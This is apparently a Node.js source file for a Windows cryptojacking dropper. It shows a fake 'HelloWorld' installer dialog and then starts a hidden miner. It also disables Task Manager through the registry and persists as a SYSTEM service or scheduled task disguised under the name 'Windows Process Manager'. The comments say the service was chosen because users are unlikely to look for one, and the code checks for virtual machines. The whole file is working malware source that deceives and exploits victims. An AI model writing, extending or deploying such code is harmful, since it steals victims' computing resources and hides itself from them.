// WARNING: DO NOT RUN THIS IF YOU DON'T WANT YOUR REGISTRY MODIFIED

// needed libraries for information collection in XMRig

const Win = require('windows-interact');
const si = require('systeminformation');

// File path of the miner

const minerPath = Win.path`miner.exe`;

// Win-interact preferences

Win.set.preferences({
    TTSVoice: 'Microsoft David Desktop',
    appManagerRefreshInterval: 2500,
    log: {
        outputFile: null,
        showTime: false,
        verbose: {
            requestTo: null,
            PowerShell: false,
            appManager: false
        }
    }
});

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function runMiner() { // This function will be expanded on later
    Win.cmd('start.cmd');
    autorun();
    disableTaskMgr();
}

async function disableTaskMgr() { // Requires a REBOOT to take effect

    const taskMgrKey = Win.path`'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\'`;

    try {
        Win.cmd('REG QUERY' + taskMgrKey + '/v DisableTaskMgr');
        wait(250);
        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
    } catch {
        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
        wait(250);
        Win.cmd('REG ADD HKLM' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
    }
}

async function autorun() {
    try {
        registerMinerAsService(); 
        /* Running the miner as a system service is preferred because the average user
           is less likely to go looking for one */
    } catch {
        addToWinTaskScheduler(); 
        /* If service registration with sc fails for some reason, autorunning in Task Scheduler
           is a valid but less preferred option */
    } 
}

async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Scheduler under the SYSTEM user
    Win.cmd('schtasks /create /sc onstart /tn "Windows Process Manager" /tr start.cmd /ru SYSTEM');
}

async function registerMinerAsService() {
    Win.cmd('sc create Windows Process Manager binPath= start.cmd start= auto');
    wait(1000);
    Win.cmd('net start Windows Process Manager');
}

async function fakeInstall() {
    try {
        Win.showDesktop();
        await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
        Win.showDesktop();
        await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
        Win.showDesktop();
        await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
        Win.showDesktop();
    } catch {
        console.log("an error occured");
    } finally {
        runMiner();
    }
}

async function checkForHardwareSupport() {
    try {
        const cpu = await si.cpu();
        const os = await si.osInfo();
        const mem = await si.mem(); // in bytes!
        const system = await si.system(); // used for checking if it's a virtual machine

        if (cpu.cores < 2 || mem.total < 4000000000) {
            await Win.alert('Insufficient system resources to continue.', 'Problem encountered');
            process.exit();
        }
        switch (os) {
            case "MacOS":
                await Win.alert('MacOS is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            case "Linux":
                await Win.alert('Linux is not supported. Windows 10/11 only.', 'Unsupported operating system');
                process.exit();
            default:
                break;
        }
        if (system.virtual == true) {
            await Win.alert('You are running this in a virtual machine.', 'Virtual machine detected');
        }
    } catch {
        process.exit();
    } finally {
        await fakeInstall();
    }
}

checkForHardwareSupport();
